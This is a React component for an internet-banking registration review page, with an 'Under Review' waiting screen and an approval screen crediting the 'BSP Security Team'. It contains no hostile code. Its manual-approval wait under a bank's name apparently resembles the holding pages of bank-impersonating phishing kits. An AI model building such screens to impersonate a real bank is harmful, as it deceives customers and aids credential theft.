import { motion } from 'motion/react';
import { Clock, CheckCircle2, ShieldCheck, ArrowRight } from 'lucide-react';

interface ReviewViewProps {
  userId: string;
  isApproved: boolean;
  onContinue: () => void;
  onCancel: () => void;
}

export function ReviewView({
  userId,
  isApproved,
  onContinue,
  onCancel
}: ReviewViewProps) {
  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-6 font-sans">
      <motion.div 
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        className="bg-white p-8 rounded-2xl shadow-sm border border-gray-100 max-w-md w-full text-center"
      >
        {isApproved ? (
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.3 }}
          >
            <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle2 className="w-9 h-9" />
            </div>
            <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-green-50 text-green-700 rounded-full text-xs font-semibold mb-3">
              <ShieldCheck size={14} />
              Identity Verified
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Internet Banking Successful!</h1>
            <p className="text-gray-600 mb-6 leading-relaxed text-sm">
              Your credentials for user ID <span className="font-mono font-semibold text-gray-800">{userId}</span> have been verified and approved by the BSP Security Team.
            </p>

            <button
              id="approved-continue-btn"
              onClick={onContinue}
              className="w-full py-3 bg-[#0091FF] text-white rounded-lg text-base font-semibold hover:bg-[#007acc] active:scale-95 transition-all cursor-pointer flex items-center justify-center gap-2 shadow-sm shadow-blue-200"
            >
              Continue to Portal
              <ArrowRight size={18} />
            </button>
          </motion.div>
        ) : (
          <div>
            <div className="w-16 h-16 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <Clock className="w-8 h-8 animate-pulse" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Under Review</h1>
            <p className="text-gray-600 mb-8 leading-relaxed text-sm">
              Your internet banking registration for ID <span className="font-mono font-semibold text-gray-800">{userId || 'User'}</span> is currently being processed by our security team. 
              <br /><br />
              Please stay on this page. You will be redirected automatically once the review is complete.
            </p>
            <div className="flex items-center justify-center gap-2 text-sm text-gray-400">
              <div className="w-2.5 h-2.5 bg-amber-400 rounded-full animate-bounce"></div>
              <div className="w-2.5 h-2.5 bg-amber-400 rounded-full animate-bounce [animation-delay:0.2s]"></div>
              <div className="w-2.5 h-2.5 bg-amber-400 rounded-full animate-bounce [animation-delay:0.4s]"></div>
            </div>
            <button 
              id="cancel-review-btn"
              onClick={onCancel}
              className="mt-8 text-slate-400 text-xs hover:text-slate-600 hover:underline transition-colors"
            >
              Cancel and Return to Login
            </button>
          </div>
        )}
      </motion.div>
    </div>
  );
}
